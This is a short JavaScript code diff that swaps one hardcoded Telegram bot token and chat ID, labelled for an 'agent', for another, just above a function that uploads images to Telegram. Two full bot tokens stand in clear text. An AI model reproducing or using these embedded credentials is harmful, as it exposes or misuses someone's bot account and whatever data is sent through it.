@@ -110,8 +110,11 @@ import axios from 'axios';
 
      //agent abi
 
-     const TELEGRAM_BOT_TOKEN = '7869664541:AAFScFIX4Ve58y8IMKcYg6Vu3PEi__18zk8';            // SHAFII
-      const TELEGRAM_CHAT_ID = '7869664541';
+     // const TELEGRAM_BOT_TOKEN = '7869664541:AAFScFIX4Ve58y8IMKcYg6Vu3PEi__18zk8';            // SHAFII
+     //  const TELEGRAM_CHAT_ID = '7869664541';
+  
+     const TELEGRAM_BOT_TOKEN = '8068079040:AAEWwb5f6Xq50GKD8TcHQOV9xUBqvTg7usQ';            // SHAFII
+      const TELEGRAM_CHAT_ID = '8068079040';
   
       const uploadImagesToTelegram = async (images, chatId, botToken) => {
         const uploadedImages = [];
